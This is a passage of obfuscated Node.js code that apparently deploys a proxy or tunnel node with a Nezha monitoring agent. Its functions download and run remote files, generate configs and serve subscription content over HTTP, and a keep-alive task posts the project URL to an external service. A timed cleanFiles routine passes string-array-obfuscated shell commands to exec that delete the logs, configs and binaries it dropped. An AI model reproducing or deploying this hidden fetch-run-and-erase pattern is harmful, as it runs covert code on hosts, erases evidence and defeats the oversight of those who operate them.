            'hkSil': _0x3d0b0c(0x11b),
            'LwtHy': function (_0x58f30c, _0x2dbfb5, _0x1002b1) {
                return _0x58f30c(_0x2dbfb5, _0x1002b1);
            },
            'AhcIg': function (_0x3a4a7f, _0x15fadb, _0x1433d7) {
                return _0x3a4a7f(_0x15fadb, _0x1433d7);
            },
            'byhXh': function (_0x58fcf0, _0x217135, _0x22474f) {
                return _0x58fcf0(_0x217135, _0x22474f);
            }
        };
    _0x576820[_0x3d0b0c(0x102)](setTimeout, () => {
        const _0xc9f442 = _0x3d0b0c, _0x4bd9ed = {
                'bWUuk': _0x576820[_0xc9f442(0x15d)],
                'NJhZO': _0x576820[_0xc9f442(0x146)]
            }, _0x4bd764 = [
                bootLogPath,
                configPath,
                webPath,
                botPath
            ];
        if (NEZHA_PORT)
            _0x4bd764[_0xc9f442(0xeb)](npmPath);
        else
            _0x576820[_0xc9f442(0x159)](NEZHA_SERVER, NEZHA_KEY) && _0x4bd764[_0xc9f442(0xeb)](phpPath);
        _0x576820[_0xc9f442(0x2b8)](process[_0xc9f442(0x2ca)], _0x576820[_0xc9f442(0x12c)]) ? _0x576820[_0xc9f442(0x30b)](exec, _0xc9f442(0x2eb) + _0x4bd764[_0xc9f442(0x1aa)]('\x20') + (_0xc9f442(0x126) + '1'), _0xfb4c4f => {
            const _0x19d809 = _0xc9f442;
            console[_0x19d809(0x13d)](), console[_0x19d809(0x270)](_0x576820[_0x19d809(0x15d)]), console[_0x19d809(0x270)](_0x576820[_0x19d809(0x146)]);
        }) : _0x576820[_0xc9f442(0x2dc)](exec, _0xc9f442(0xee) + _0x4bd764[_0xc9f442(0x1aa)]('\x20') + (_0xc9f442(0x1ba) + _0xc9f442(0x122)), _0x227178 => {
            const _0x23ead6 = _0xc9f442;
            console[_0x23ead6(0x13d)](), console[_0x23ead6(0x270)](_0x4bd9ed[_0x23ead6(0x1df)]), console[_0x23ead6(0x270)](_0x4bd9ed[_0x23ead6(0x10a)]);
        });
    }, 0x48 * 0x954 + -0x260db + 0x625 * 0x2f);
}
cleanFiles();
async function AddVisitTask() {
    const _0x2f3259 = _0x20aa4b, _0x1e5646 = {
            'PlwZo': function (_0x18795d, _0x28a4a4) {
                return _0x18795d || _0x28a4a4;
            },
            'BczJI': _0x2f3259(0x1a7) + _0x2f3259(0x185) + _0x2f3259(0x28e) + _0x2f3259(0x153),
            'YGUFp': _0x2f3259(0x106) + _0x2f3259(0x281) + _0x2f3259(0x206) + 'l',
            'JyMgw': _0x2f3259(0x20b) + _0x2f3259(0x181)
        };
    if (_0x1e5646[_0x2f3259(0x322)](!AUTO_ACCESS, !PROJECT_URL)) {
        console[_0x2f3259(0x270)](_0x1e5646[_0x2f3259(0x1e7)]);
        return;
    }
    try {
        const _0x18a3d4 = await axios[_0x2f3259(0xfd)](_0x1e5646[_0x2f3259(0x213)], { 'url': PROJECT_URL }, { 'headers': { 'Content-Type': _0x1e5646[_0x2f3259(0x227)] } });
        return console[_0x2f3259(0x270)](_0x2f3259(0x2e7) + _0x2f3259(0xe2) + _0x2f3259(0x232) + _0x2f3259(0x2ed)), _0x18a3d4;
    } catch (_0x2d65f9) {
        return console[_0x2f3259(0x15a)](_0x2f3259(0x14f) + _0x2f3259(0x22f) + _0x2f3259(0x13a) + _0x2f3259(0x1e8) + _0x2d65f9[_0x2f3259(0x203)]), null;
    }
}
async function startserver() {
    const _0x2aa4fb = _0x20aa4b, _0x58ee53 = {
            'cHBPk': _0x2aa4fb(0x19d) + _0x2aa4fb(0x286),
            'jQYuC': function (_0x217c17) {
                return _0x217c17();
            },
            'uACUq': function (_0x318597) {
                return _0x318597();
            },
            'XBjFY': function (_0xbe7b8d) {
                return _0xbe7b8d();
            },
            'qCWau': _0x2aa4fb(0x305) + _0x2aa4fb(0x1fd) + ':'
        };
    try {
        const _0x3c6186 = _0x58ee53[_0x2aa4fb(0x18c)][_0x2aa4fb(0x27c)]('|');
        let _0x27598f = 0x216c + 0x1f5b + -0x17 * 0x2d1;
        while (!![]) {
            switch (_0x3c6186[_0x27598f++]) {
            case '0':
                _0x58ee53[_0x2aa4fb(0x158)](cleanupOldFiles);
                continue;
            case '1':
                await _0x58ee53[_0x2aa4fb(0x158)](downloadFilesAndRun);
                continue;
            case '2':
                await _0x58ee53[_0x2aa4fb(0x25a)](generateConfig);
                continue;
            case '3':
                await _0x58ee53[_0x2aa4fb(0x2a0)](AddVisitTask);
                continue;
            case '4':
                await _0x58ee53[_0x2aa4fb(0x25a)](extractDomains);
                continue;
            case '5':
                _0x58ee53[_0x2aa4fb(0x25a)](argoType);
                continue;
            case '6':
                _0x58ee53[_0x2aa4fb(0x158)](deleteNodes);
                continue;
            }
            break;
        }
    } catch (_0x24d922) {
        console[_0x2aa4fb(0x15a)](_0x58ee53[_0x2aa4fb(0x1b8)], _0x24d922);
    }
}
startserver()[_0x20aa4b(0x233)](_0x334183 => {
    const _0x1d8109 = _0x20aa4b, _0xdc3f37 = { 'UFGRH': _0x1d8109(0x13b) + _0x1d8109(0x149) + _0x1d8109(0x1fd) + ':' };
    console[_0x1d8109(0x15a)](_0xdc3f37[_0x1d8109(0xed)], _0x334183);
});
const server = http[_0x20aa4b(0xe9) + 'er'](async (_0x76f39f, _0x4ed882) => {
    const _0x5654e3 = _0x20aa4b, _0x252e12 = {
            'Egafu': function (_0x5e0b06, _0x31e2b5) {
                return _0x5e0b06 === _0x31e2b5;
            },
            'LvbhI': _0x5654e3(0x11c) + _0x5654e3(0x134) + _0x5654e3(0x162),
            'uwzuZ': _0x5654e3(0x162),
            'nVCcv': _0x5654e3(0x165) + _0x5654e3(0x1a5) + _0x5654e3(0x287) + _0x5654e3(0x104) + _0x5654e3(0x297) + _0x5654e3(0x1ff) + _0x5654e3(0x1fe),
            'nXsyG': function (_0x2e40b8, _0x31ca10) {
                return _0x2e40b8 === _0x31ca10;
            },
            'ZHLeg': _0x5654e3(0x25e),
            'QHkHf': _0x5654e3(0x20e),
            'gjLrn': _0x5654e3(0x1d1) + _0x5654e3(0x112) + _0x5654e3(0x235),
            'WqJxy': _0x5654e3(0x1b4) + _0x5654e3(0x238) + _0x5654e3(0x2e0) + _0x5654e3(0x2d2) + _0x5654e3(0x272) + _0x5654e3(0x31e) + _0x5654e3(0x121) + _0x5654e3(0x2fe),
            'nRuMU': _0x5654e3(0x1bf)
        }, _0x507f1c = _0x76f39f[_0x5654e3(0x16e)][_0x5654e3(0x27c)]('?')[-0x11a + 0xe59 * -0x1 + 0xf73];
    if (_0x252e12[_0x5654e3(0x2de)](_0x507f1c, '/' + SUB_PATH)) {
        if (subContent)
            _0x4ed882[_0x5654e3(0x318)](0x1 * -0x703 + 0x1 * -0xd2d + 0xf4 * 0x16, { 'Content-Type': _0x252e12[_0x5654e3(0x1b7)] }), _0x4ed882[_0x5654e3(0x289)](subContent);
        else
            try {
                const _0x23c7b0 = fs[_0x5654e3(0x1c3) + 'nc'](subPath, _0x252e12[_0x5654e3(0xe5)]);
                _0x4ed882[_0x5654e3(0x318)](0x2 * -0x526 + 0x909 * 0x1 + -0x1 * -0x20b, { 'Content-Type': _0x252e12[_0x5654e3(0x1b7)] }), _0x4ed882[_0x5654e3(0x289)](_0x23c7b0);
            } catch (_0x34853c) {
                _0x4ed882[_0x5654e3(0x318)](0x16e0 + 0x682 + -0x1b6b, { 'Content-Type': _0x252e12[_0x5654e3(0x1b7)] }), _0x4ed882[_0x5654e3(0x289)](_0x252e12[_0x5654e3(0x2c6)]);
            }
        return;
    }
    if (_0x252e12[_0x5654e3(0x2b7)](_0x507f1c, '/')) {
        try {
            const _0x11156c = path[_0x5654e3(0x1aa)](__dirname, _0x252e12[_0x5654e3(0x1f2)]), _0x202062 = await fs[_0x5654e3(0x190)][_0x5654e3(0x2bc)](_0x11156c, _0x252e12[_0x5654e3(0x155)]);
            _0x4ed882[_0x5654e3(0x318)](-0xf * 0x282 + -0x3f8 + 0x2a5e, { 'Content-Type': _0x252e12[_0x5654e3(0x2fc)] }), _0x4ed882[_0x5654e3(0x289)](_0x202062);
        } catch (_0x37c920) {
            _0x4ed882[_0x5654e3(0x318)](-0x17d7 + -0x1659 + 0x2ef8, { 'Content-Type': _0x252e12[_0x5654e3(0x2fc)] }), _0x4ed882[_0x5654e3(0x289)](_0x252e12[_0x5654e3(0xf4)]);
        }
        return;
    }
    _0x4ed882[_0x5654e3(0x318)](0x22fc + 0xf9f + 0x4d * -0xa3, { 'Content-Type': _0x252e12[_0x5654e3(0x1b7)] }), _0x4ed882[_0x5654e3(0x289)](_0x252e12[_0x5654e3(0x313)]);
});
server[_0x20aa4b(0x1c2)](PORT, () => console[_0x20aa4b(0x270)](_0x20aa4b(0x18f) + _0x20aa4b(0x1f0) + _0x20aa4b(0x19b) + ':' + PORT + '!'));
